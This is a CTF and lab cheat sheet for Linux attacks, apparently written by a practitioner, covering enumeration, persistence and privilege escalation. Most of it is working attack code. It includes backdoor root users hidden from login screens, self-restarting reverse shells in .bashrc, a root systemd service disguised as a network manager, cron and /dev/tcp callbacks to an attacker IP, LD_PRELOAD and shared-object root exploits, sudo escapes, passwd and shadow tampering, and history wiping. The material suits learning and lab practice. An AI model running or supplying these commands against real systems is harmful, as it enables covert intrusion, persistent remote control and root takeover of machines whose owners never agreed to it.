🐧 Linux 🔧 Bash 🏁 CTF / Lab ✍️ m.manikandan

# Linux Security — Field Notes

🔍 Enumeration → 🔒 Persistence → ⚡ Privilege Escalation

📋 Table of Contents

🔍 Enumeration

[1. System Information](#s1) [2. User & Group Enumeration](#s2) [3. Network Enumeration](#s3) [4. Process & Services](#s4) [5. Scheduled Tasks](#s5) [6. File System & Interesting Files](#s6) [7. Credentials & Sensitive Files](#s7) [8. Installed Software & Kernel Exploits](#s8)

🔒 Persistence

[9. Backdoor User (5 Methods)](#s9) [10. .bashrc / .bash_profile](#s10) [11. SSH Public Key](#s11) [12. Systemd Service + Netcat](#s12)

⚡ Privilege Escalation

[13. SUID Binary Abuse](#s13) [14. Linux Capabilities](#s14) [15. Vulnerable Sudo / GTFOBins](#s15) [16. Sudo SETENV + LD_PRELOAD](#s16) [17. Shared Object Injection](#s17) [18. Cron Job Abuse](#s18) [19. Writable PATH Hijack](#s19) [20. Systemd Service Abuse](#s20) [21. Docker Group Escalation](#s21) [22. Incus / LXC Container](#s22) [23. NFS no_root_squash](#s23) [24. Polkit rules.d](#s24) [25. Writable /etc/passwd](#s25) [26. Readable Root SSH Key](#s26) [27. Reverse Shell via nc](#s27) [28. Kernel Exploits](#s28) [29. Linux Internals Reference](#s29)

⚠️ For authorized lab / CTF environments only. Never test on systems you do not own or have explicit permission to test.

🔍

## Enumeration

Gather system, user, network, file and credential information

01 System Information ▶

bash

```
uname -a                  # Kernel version, architecture
cat /proc/version         # Detailed kernel, compiler info
cat /etc/os-release       # Distro name and version
lsb_release -a            # Another distro check
hostnamectl               # Hostname, kernel, architecture
cat /etc/*-release        # Catch-all for release files
cat /proc/cpuinfo         # CPU details
cat /proc/meminfo         # Memory details
```

02 User & Group Enumeration ▶

bash

```
id                                      # Current user, groups
whoami                                  # Current username
cat /etc/passwd                         # All users
cat /etc/shadow                         # Password hashes (requires root)
cat /etc/group                          # All groups
getent passwd                           # Same as /etc/passwd
sudo -l                                 # Commands allowed with sudo (GOLD)
cat /etc/sudoers                        # Sudo configuration (if readable)
find / -user <username> 2>/dev/null    # Files owned by a specific user
lastlog                                 # Last login of all users
w                                       # Who is logged on
```

03 Network Enumeration ▶

bash

```
ifconfig / ip a s                          # Network interfaces, IPs
ip route / route -n                        # Routing table
arp -a                                     # ARP cache
netstat -tulpn / ss -tulpn                 # Listening ports, processes
netstat -antp / ss -antp                   # All TCP connections with PIDs
cat /etc/hosts                             # Static host mappings
cat /etc/resolv.conf                       # DNS servers
iptables -L -n / nft list ruleset          # Firewall rules (if root/sudo)
```

04 Process & Services ▶

bash

```
ps aux                                                        # All processes
ps aux --forest                                               # Tree view
systemctl list-units --type=service --state=running           # Active services
service --status-all                                          # SysV services
top -n 1 -b                                                   # One-shot snapshot
pspy                                                          # Unprivileged process monitor
cat /proc/1/comm                                              # PID 1 (init system)
ls -la /proc/*/exe 2>/dev/null | grep -v "Permission denied"  # Find binaries
cat /etc/inetd.conf /etc/xinetd.conf                          # Legacy service configs
```

05 Scheduled Tasks ▶

bash

```
crontab -l                     # Current user's cron jobs
cat /etc/crontab               # System-wide crontab
ls -la /etc/cron.*             # daily, hourly, monthly, weekly
systemctl list-timers --all    # Systemd timers
cat /etc/anacrontab            # Anacron jobs
```

06 File System & Interesting Files ▶

bash

```
find / -writable -type f 2>/dev/null                                          # World-writable files
find / -perm -4000 -type f 2>/dev/null                                        # SUID binaries
find / -perm -2000 -type f 2>/dev/null                                        # SGID binaries
find / -perm -o=r -type f 2>/dev/null                                         # World-readable files
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null           # Configs
find / -name "*.log" -type f 2>/dev/null                                       # Log files (may leak creds)
find / -name ".git" -type d 2>/dev/null                                        # Git repos
ls -la /var/backups /opt /tmp /var/tmp                                         # Backups/scratch
cat /etc/fstab                                                                  # Mounted filesystems
mount                                                                           # Currently mounted shares
df -h                                                                           # Disk usage
```

07 Credentials & Sensitive Files ▶

bash

```
grep -rni "password" /etc/ 2>/dev/null
grep -rni "passwd" /var/log/ 2>/dev/null
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null   # SSH keys
history
cat ~/.bash_history
cat ~/.mysql_history
env                                                                     # Env variables (secrets!)
cat /proc/1/environ | tr '\0' '\n'                                     # Env of PID 1
```

08 Installed Software & Kernel Exploits ▶

bash

```
dpkg -l / rpm -qa                     # Installed packages (Debian/RPM)
sudo -V                               # Sudo version
pkexec --version                      # Polkit version
ls -la /usr/local/bin /usr/bin /bin   # Custom installed binaries
ls -la /usr/sbin /sbin                # Admin tools
apk list --installed                  # Alpine Linux
uname -a                              # Kernel version → check exploit-db
```

### Useful Tools

bash

```
# Automated enumeration
https://github.com/peass-ng/PEASS-ng.git
https://github.com/The-Z-Labs/linux-exploit-suggester.git
https://github.com/Aegrah/PANIX.git

pip install gtfobins-cli --break-system-packages
gtfo python
```

🔒

## Persistence

Maintain access across reboots and sessions

09 Backdoor User — 5 Methods ▶

### METHOD 1 backdoor

bash

```
groupdel backdoor 2>/dev/null; useradd -m -s /bin/bash -U backdoor && echo 'backdoor:backdoor' | chpasswd
```

### METHOD 2 ghost (UID 0 Root Clone)

bash

```
groupadd ghost 2>/dev/null; useradd -o -u 0 -g 0 -s /bin/bash -M -d /root ghost && echo 'ghost:ghost' | chpasswd
```

### METHOD 3 hacker (Manual passwd/shadow)

bash

```
HASH=$(openssl passwd -6 'hacker') && echo "hacker:x:1337:1337::/home/hacker:/bin/bash" >> /etc/passwd && echo "hacker:${HASH}:19000:0:99999:7:::" >> /etc/shadow && groupadd -g 1337 hacker && mkdir -p /home/hacker && chown 1337:1337 /home/hacker
```

### METHOD 4 support (sudo group)

bash

```
useradd -m -s /bin/bash -U support && echo 'support:support' | chpasswd && usermod -aG sudo support
```

### METHOD 5 pyuser (Python)

bash

```
python3 -c "
import subprocess
h = subprocess.check_output(['openssl','passwd','-6','pyuser']).decode().strip()
open('/etc/passwd','a').write('pyuser:x:1339:1339::/home/pyuser:/bin/bash\n')
open('/etc/shadow','a').write(f'pyuser:{h}:19000:0:99999:7:::\n')
" && groupadd -g 1339 pyuser && mkdir -p /home/pyuser && chown 1339:1339 /home/pyuser
```

### VERIFY All 5

bash

```
for u in backdoor ghost hacker support pyuser; do echo -n "$u → " && su $u -c "id" 2>&1; done
```

### STEALTH Hide the User

bash

```
# GDM3
nano /etc/gdm3/custom.conf
[daemon]
Exclude=backdoor

# LightDM
nano /etc/lightdm/users.conf
hidden-users=backdoor
```

### CLEANUP All 5

bash

```
for u in backdoor ghost hacker support pyuser; do userdel -r $u 2>/dev/null; groupdel $u 2>/dev/null; sed -i "/^${u}:/d" /etc/passwd /etc/shadow /etc/group; rm -rf /home/$u; done
grep -E 'backdoor|ghost|hacker|support|pyuser' /etc/passwd && ls /home/
```

10 .bashrc / .bash_profile Persistence ▶

### STEP 1 Attacker Listener

bash

```
nc -lvnp 4444
```

### STEP 2 Purge .bashrc

bash

```
sed -i '/nc 192.168.66.5 4444/d' ~/.bashrc
sed -i '/bash-loop-2222/d' ~/.bashrc
sed -i '/mkfifo \/tmp\/\.f/d' ~/.bashrc
sed -i '/mkfifo \/tmp\/f/d' ~/.bashrc
sed -i '/nc 192.168.66.5 4444/d; /mkfifo \/tmp\/\.p/d; /mkfifo \/tmp\/f/d; /bash-loop/d; /nc-loop/d; /\/dev\/tcp\/192\.168\.66\.5\/4444/d; /nohup sh -c/d' ~/.bashrc
grep -n -E 'nc|mkfifo|/dev/tcp|bash-loop|nc-loop' ~/.bashrc
```

### STEP 3 Kill Lingering Jobs

bash

```
pkill -f 'nc 192.168.66.5 4444'
pkill -f 'mkfifo /tmp/f'
pkill -f 'mkfifo /tmp/.f'
```

### STEP 4 Add Persistent Loop

bash

```
cat >> ~/.bashrc << 'EOF'
# persistence-loop (quiet, self-healing)
if ! pgrep -f "nc-loop-4444" > /dev/null; then
    (
        while true; do
            if ! pgrep -f "nc 192.168.66.5 4444" > /dev/null; then
                rm -f /tmp/.p
                mkfifo /tmp/.p
                cat /tmp/.p | /bin/bash -i 2>&1 | nc 192.168.66.5 4444 > /tmp/.p
            fi
            sleep 10
        done
    ) >/dev/null 2>&1 &
    disown %-
fi
EOF
```

### OR With PTY

bash

```
pkill -f 'nc 192.168.66.5 4444'
while true; do
    rm -f /tmp/.p
    mkfifo /tmp/.p
    cat /tmp/.p | python3 -c 'import pty; pty.spawn("/bin/bash")' 2>&1 | nc 192.168.66.5 4444 > /tmp/.p
    sleep 5
done
```

### TRIGGER

bash

```
exec bash
```

### CLEANUP

bash

```
sed -i '/nc 10.0.2.30 4444/d' ~/.bashrc
history -c
rm ~/.bash_history
```

11 SSH Public Key Persistence ▶

### STEP 1 Generate Key Pair

bash

```
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persist -N ""
```

### STEP 2 Install Public Key

bash

```
cat ~/.ssh/persist.pub > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### STEP 3 Test Login

bash

```
ssh -i ~/.ssh/persist kali@192.168.66.5
```

### BACKUP

bash

```
cp ~/.ssh/persist ~/backup_persist.key
```

### CLEANUP

bash

```
sed -i '/persist/d' ~/.ssh/authorized_keys 2>/dev/null; rm -f ~/.ssh/persist ~/.ssh/persist.pub ~/.ssh/config
```

12 Systemd Service + Netcat ▶

### STEP 1 Attacker Listener

bash

```
nc -lvnp 4444
```

### STEP 2 Create Service (with -e flag)

bash

```
cat > /etc/systemd/system/sysnetwork.service << 'EOF'
[Unit]
Description=System Network Manager Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'nc -e /bin/bash 127.0.0.1 4444'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
```

### STEP 3 OpenBSD nc (no -e flag)

bash

```
cat > /etc/systemd/system/sysnetwork.service << 'EOF'
[Unit]
Description=System Network Manager Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'rm -f /tmp/.p; mkfifo /tmp/.p; cat /tmp/.p | /bin/bash -i 2>&1 | nc 127.0.0.1 4444 > /tmp/.p'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF
```

### STEP 4 Enable & Start

bash

```
systemctl daemon-reload && systemctl enable sysnetwork.service && systemctl start sysnetwork.service
```

### VERIFY

bash

```
systemctl status sysnetwork.service
systemctl is-enabled sysnetwork.service
systemctl restart sysnetwork.service
systemctl list-units --type=service --state=enabled | grep -v snap
ls -la /etc/systemd/system/
```

### CLEANUP

bash

```
systemctl stop sysnetwork.service && systemctl disable sysnetwork.service && rm /etc/systemd/system/sysnetwork.service && systemctl daemon-reload && rm -f /tmp/.p
systemctl status sysnetwork.service 2>&1
ls /etc/systemd/system/ | grep -v snap
```

⚡

## Privilege Escalation

Escalate from low-privileged user to root

13 SUID Binary Abuse ▶

### FIND SUID Binaries

bash

```
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
find / -perm -4000 -type f 2>/dev/null > suid_bins.txt
```

### EXPLOIT SUID Root Shell

bash

```
cp /bin/bash /home/kali/bash_suid
sudo chown root:root /home/kali/bash_suid
sudo chmod u+s /home/kali/bash_suid
/home/kali/bash_suid -p
# id → euid=0(root)
```

### OPTION 2 .deb postinst trick

bash

```
mkdir -p /tmp/rootme/DEBIAN
cat > /tmp/rootme/DEBIAN/control <<EOF
Package: rootme
Version: 1
Architecture: all
Maintainer: a
Description: a
EOF
cat > /tmp/rootme/DEBIAN/postinst <<EOF
#!/bin/bash
/bin/bash -i
EOF
chmod 755 /tmp/rootme/DEBIAN/postinst
dpkg-deb -b /tmp/rootme /tmp/rootme.deb
sudo dpkg -i /tmp/rootme.deb
```

### SINGLE One-liner

bash

```
mkdir -p /tmp/rootme/DEBIAN && echo -e 'Package: rootme\nVersion: 1\nArchitecture: all\nMaintainer: a\nDescription: a\n' > /tmp/rootme/DEBIAN/control && echo '#!/bin/bash' > /tmp/rootme/DEBIAN/postinst && echo '/bin/bash -i' >> /tmp/rootme/DEBIAN/postinst && chmod 755 /tmp/rootme/DEBIAN/postinst && dpkg-deb -b /tmp/rootme /tmp/rootme.deb >/dev/null 2>&1 && sudo dpkg -i /tmp/rootme.deb
```

### OPTION 3

bash

```
ls -ld /home/kali
sudo chown kali:kali /home/kali
cp /bin/bash /home/kali/shell_suid
sudo chown root:root /home/kali/shell_suid
sudo chmod u+s /home/kali/shell_suid
/home/kali/shell_suid -p
```

### CLEANUP

bash

```
sudo rm /home/kali/bash_suid /home/kali/shell_suid /home/kali/test_suid /tmp/vuln /tmp/bash_suid /tmp/libcustom.* /tmp/PwnKit 2>/dev/null
sudo rm /root/testfile
```

14 Linux Capabilities ▶

### cap_setuid → root shell

bash

```
cp /usr/bin/python3 /home/kali/pycap
sudo setcap cap_setuid=ep /home/kali/pycap
getcap /home/kali/pycap
# Output: /home/kali/pycap cap_setuid=ep
/home/kali/pycap -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
```

### cap_dac_read_search → read any file

bash

```
cp /bin/cat /home/kali/readcat
sudo setcap cap_dac_read_search=ep /home/kali/readcat
/home/kali/readcat /etc/shadow
```

### cap_sys_ptrace injection demo

bash

```
sudo sleep 1000 &
cp /bin/bash /home/kali/ptbash
sudo setcap cap_sys_ptrace=ep /home/kali/ptbash
/home/kali/ptbash -c 'kill -STOP <PID_of_sleep>; echo "Attach would succeed here"'
```

### CLEANUP

bash

```
rm /home/kali/pycap /home/kali/readcat /home/kali/ptbash
sudo sed -i '/^evil:/d' /etc/passwd
```

15 Vulnerable Sudo Rules / GTFOBins ▶

bash

```
sudo -l
sudo -i
```

### find

bash

```
sudo find . -exec /bin/sh \; -quit
sudo find . -exec /bin/bash -p \; -quit
```

### vim / vi

bash

```
sudo vim -c ':!/bin/sh'
```

### perl

bash

```
sudo perl -e 'exec "/bin/sh";'
```

### python

bash

```
sudo python -c 'import os; os.system("/bin/sh")'
```

### awk

bash

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

### git

bash

```
sudo git -p help
# Then type: !/bin/sh
```

### node

bash

```
sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```

### Add root user

bash

```
echo "root2::0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
su root2
```

16 Sudo SETENV + LD_PRELOAD ▶

### SETUP Create Vulnerable User

bash

```
sudo useradd -m -s /bin/bash testuser
sudo passwd testuser          # e.g. "lab123"
sudo visudo -f /etc/sudoers.d/testuser
# Add: testuser ALL=(ALL:ALL) SETENV: ALL
```

### EXPLOIT Malicious Library

bash

```
su - testuser

cat > /tmp/preload.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void _init(void) {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so /bin/true
```

### CLEANUP

bash

```
sudo rm /etc/sudoers.d/testuser
sudo userdel -r testuser
rm /tmp/preload.c /tmp/preload.so
```

17 Shared Object Injection ▶

### BUILD Lab

bash

```
mkdir -p /home/kali/solab && cd /home/kali/solab
cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
void greet() { printf("Hello from library\n"); }
EOF
gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c
cat > main.c << 'EOF'
void greet();
int main() { greet(); return 0; }
EOF
gcc -o vuln main.c -L/tmp -lcustom -Wl,-rpath,/tmp
sudo chown root:root vuln
sudo chmod u+s vuln
ldd ./vuln | grep custom
```

### EXPLOIT

bash

```
cat > /tmp/evil.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
__attribute__((constructor)) void pwned() {
    unsetenv("LD_PRELOAD");
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -nostartfiles -o /tmp/libcustom.so /tmp/evil.c
/home/kali/solab/vuln
```

### CLEANUP

bash

```
rm -rf /home/kali/solab /tmp/libcustom.so /tmp/evil.c /tmp/libcustom.c 2>/dev/null
```

18 Cron Job Abuse ▶

### SETUP

bash

```
sudo mkdir -p /opt/revlab
sudo chmod 777 /opt/revlab
cat << 'EOF' | sudo tee /opt/revlab/backup.sh > /dev/null
#!/bin/bash
bash -i >& /dev/tcp/192.168.66.5/4444 0>&1
EOF
sudo chmod +x /opt/revlab/backup.sh
echo "* * * * * root /opt/revlab/backup.sh" | sudo tee -a /etc/crontab
```

### LISTENER

bash

```
nc -lvnp 4444
```

### CLEANUP

bash

```
sudo sed -i '/\/opt\/revlab\/backup.sh/d' /etc/crontab
sudo rm -rf /opt/revlab
```

19 Writable PATH Hijack ▶

bash

```
# 1. Make directory world-writable
sudo chmod 777 /usr/local/bin

# 2. Create malicious script
cat > /usr/local/bin/cleanup << 'EOF'
#!/bin/bash
echo "evil::0:0:root:/root:/bin/bash" >> /etc/passwd
EOF
chmod +x /usr/local/bin/cleanup

# 3. Add to root's crontab
echo -e "PATH=/usr/local/bin:/usr/bin:/bin\n* * * * * cleanup" | sudo crontab -

# 4. Verify
sudo crontab -l
# PATH=/usr/local/bin:/usr/bin:/bin
# * * * * * cleanup

# 5. Ensure cron running
sudo systemctl start cron

# 6. Wait
echo "Waiting for cron to fire..."
sleep 65

# 7. Check /etc/passwd
tail -3 /etc/passwd
# evil::0:0:root:/root:/bin/bash

# 8. Become root
su evil
```

### CLEANUP

bash

```
sudo sed -i '/^evil:/d' /etc/passwd
sudo crontab -r
sudo chmod 755 /usr/local/bin
sudo rm /usr/local/bin/cleanup
```

20 Systemd Service Abuse ▶

### SETUP

bash

```
sudo mkdir -p /opt/service-lab && sudo chmod 777 /opt/service-lab
sudo tee /opt/service-lab/cleanup.sh << 'EOF' > /dev/null
#!/bin/bash
echo "$(date) - service ran" >> /var/log/cleanup.log
EOF
sudo chmod 777 /opt/service-lab/cleanup.sh
sudo tee /etc/systemd/system/cleanup.service << 'EOF' > /dev/null
[Unit]
Description=Cleanup Service
[Service]
Type=simple
ExecStart=/opt/service-lab/cleanup.sh
User=root
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload && sudo systemctl start cleanup.service && sudo systemctl enable cleanup.service
```

### VERIFY

bash

```
sudo systemctl status cleanup
sudo cat /var/log/cleanup.log
```

### EXPLOIT

bash

```
nc -lvnp 4444
cat > /opt/service-lab/cleanup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.66.5/4444 0>&1
EOF
sudo systemctl restart cleanup
```

### CLEANUP

bash

```
sudo systemctl stop cleanup && sudo systemctl disable cleanup && sudo rm /etc/systemd/system/cleanup.service && sudo systemctl daemon-reload && sudo rm -rf /opt/service-lab
```

21 Docker Group Escalation ▶

bash

```
groups
sudo apt update && sudo apt install docker.io -y
sudo usermod -aG docker $USER
newgrp docker
groups    # should show "docker"

# Mount host root fs into container
docker run -v /:/mnt -it alpine

# Inside container:
sed -i 's/^root:\*:/root::/' /mnt/etc/shadow
head -1 /mnt/etc/shadow    # should show root:: (no password)
exit

# Back on host:
su -
```

### RESTORE

bash

```
sed -i 's/^root::/root:*:/' /etc/shadow
passwd -l root
sudo groupdel docker
```

22 Incus / LXC Privileged Container ▶

bash

```
# Install & setup
sudo apt update && sudo apt install incus -y
sudo usermod -aG incus $USER
newgrp incus
sudo systemctl start incus && sudo systemctl enable incus
incus admin init --auto

# Create privileged container with host mount
incus launch images:alpine/edge privesc -c security.privileged=true
incus config device add privesc host-root disk source=/ path=/mnt/root
incus restart privesc

# Get root shell inside container
incus exec privesc -- /bin/sh

# Remove password lock from HOST root account
sed -i 's/^root:[!*]:/root::/' /mnt/root/etc/shadow
exit

# Become root on host
su -
```

### CLEANUP

bash

```
incus stop privesc && incus delete privesc
passwd -l root
sudo gpasswd -d $USER incus
```

23 NFS no_root_squash ▶

### PREP

bash

```
sudo groupadd docker 2>/dev/null
sudo systemctl restart docker.socket && sudo systemctl start docker
docker ps
```

### NFS SERVER

bash

```
sudo apt update && sudo apt install nfs-kernel-server -y
sudo mkdir -p /nfs_share && sudo chmod 777 /nfs_share
echo "/nfs_share *(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports
sudo exportfs -ra && sudo systemctl restart nfs-server
showmount -e localhost
# Export list for localhost:
# /nfs_share *
```

### NFS CLIENT (Docker)

bash

```
docker run -it --rm --privileged --name nfs-client ubuntu bash
apt update && apt install nfs-common -y
mkdir /mnt/nfs && mount -t nfs 172.17.0.1:/nfs_share /mnt/nfs
cp /bin/bash /mnt/nfs/rootshell && chmod u+s /mnt/nfs/rootshell
ls -l /mnt/nfs/rootshell    # -rwsr-xr-x 1 root root
exit
```

### ESCALATE

bash

```
/nfs_share/rootshell -p
id    # euid=0(root)
```

### CLEANUP

bash

```
sudo rm -f /nfs_share/rootshell /nfs_share/testfile
sudo sed -i '/\/nfs_share/d' /etc/exports
sudo exportfs -ra && sudo systemctl stop nfs-server && sudo systemctl disable nfs-server
sudo rm -rf /nfs_share
sudo apt remove --purge nfs-kernel-server nfs-common -y
docker rm -f nfs-client 2>/dev/null
```

24 Polkit rules.d Misconfiguration ▶

bash

```
# Identify misconfiguration
find /etc/polkit-1/rules.d/ -writable -type d 2>/dev/null

# Create malicious rule
cat > /etc/polkit-1/rules.d/99-pwn.rules << 'EOF'
polkit.addRule(function(action, subject) {
    if (action.id == "org.freedesktop.policykit.exec") {
        return polkit.Result.YES;
    }
});
EOF
chmod 644 /etc/polkit-1/rules.d/99-pwn.rules
cat /etc/polkit-1/rules.d/99-pwn.rules

# Trigger escalation
pkexec /bin/bash -p
```

### CLEANUP

bash

```
rm /etc/polkit-1/rules.d/99-pwn.rules
```

25 Writable /etc/passwd ▶

bash

```
# 1. Make writable
sudo chmod 646 /etc/passwd
ls -l /etc/passwd    # -rw-rw-rw-

# 2. Generate hash
hash=$(openssl passwd -6 "mani")
echo "$hash"

# 3. Backup and patch
cp /etc/passwd /etc/passwd.bak
sudo sed -i "s|^root:[^:]*:|root:${hash}:|" /etc/passwd
head -1 /etc/passwd
# root:$6$dG91Y2...:0:0:root:/root:/bin/bash

# 4. Become root
su root
```

### ALTERNATIVE Add new root user

bash

```
hash=$(openssl passwd -6 "mani")
echo "backdoor:${hash}:0:0:root:/root:/bin/bash" >> /etc/passwd
su backdoor    # Enter "mani" → root
```

### CLEANUP

bash

```
sudo cp /etc/passwd.bak /etc/passwd
sudo chmod 644 /etc/passwd
sudo rm /etc/passwd.bak
```

26 Readable Root SSH Key ▶

bash

```
# Install SSH server
sudo apt update && sudo apt install openssh-server -y
sudo systemctl start ssh && sudo systemctl enable ssh

# Allow root login
sudo sed -i 's/^#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config > /dev/null
sudo systemctl restart ssh

# Generate key pair (as root)
ssh-keygen -t rsa -b 4096 -f /root/.ssh/id_rsa -N ""
cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Simulate misconfiguration – make private key world-readable
chmod o+r /root/.ssh/id_rsa
ls -l /root/.ssh/id_rsa    # -rw-r--r--

# Copy to kali user
cp /root/.ssh/id_rsa /home/kali/stolen_key
chown kali:kali /home/kali/stolen_key && chmod 600 /home/kali/stolen_key
exit

# As kali – SSH in as root
ssh -i /home/kali/stolen_key root@localhost
# you got root
```

### CLEANUP

bash

```
rm /root/.ssh/id_rsa /root/.ssh/id_rsa.pub
rm /home/kali/stolen_key
> /root/.ssh/authorized_keys
sed -i 's/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart ssh
```

27 Reverse Shell via nc ▶

bash

```
sudo nc -e /bin/sh 192.168.66.5 4444

nc -lvnp 4444
```

28 Kernel Exploits ▶

bash

```
uname -a    # Get kernel version → search exploit-db
```

🔗 [Linux Kernel – Local Privilege Escalation (52591)](https://www.exploit-db.com/exploits/52591)

🔗 [Linux Kernel – Local Privilege Escalation (52585)](https://www.exploit-db.com/exploits/52585)

29 Linux Internals Reference Notes ▶

### Cache Indexing Methods

reference

```
VIVT — Virtually Indexed,  Virtually Tagged
PIPT — Physically Indexed, Physically Tagged
PIVT — Physically Indexed, Virtually Tagged
VIPT — Virtually Indexed,  Physically Tagged
```

### Concepts

topics

```
Seccomp, KSM, MMU, I/O buses, CPU execution ports
CPU mesh, Linux Kernel Crypto Subsystem
Cross-core attack, cross-CPU attack
File I/O: Buffered I/O | Page cache | Standard library | Synchronized I/O
SELinux vs AppArmor
```

### Systemd / Session

bash

```
sudo visudo
nano /etc/sudoers
systemd-cgls --unit user.slice
pstree -slap
```

### D-Bus IPC

bash

```
# Check D-Bus status
systemctl status dbus
ps aux | grep dbus
busctl list

# Enumerate services
dbus-send --system --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Introspect a service
gdbus introspect --system --dest org.freedesktop.NetworkManager \
  --object-path /org/freedesktop/NetworkManager
busctl introspect org.freedesktop.NetworkManager /org/freedesktop/NetworkManager

# Monitor traffic
busctl monitor
dbus-monitor --system
dbus-monitor --system "destination='org.freedesktop.systemd1'"
```

### Tools

bash

```
https://github.com/Aegrah/PANIX.git
https://github.com/The-Z-Labs/linux-exploit-suggester.git
https://github.com/peass-ng/PEASS-ng.git

pip install gtfobins-cli --break-system-packages
gtfo python
```

⚠️ For educational use in authorized environments only. Always run cleanup steps after each lab.

Curated by **m.manikandan**
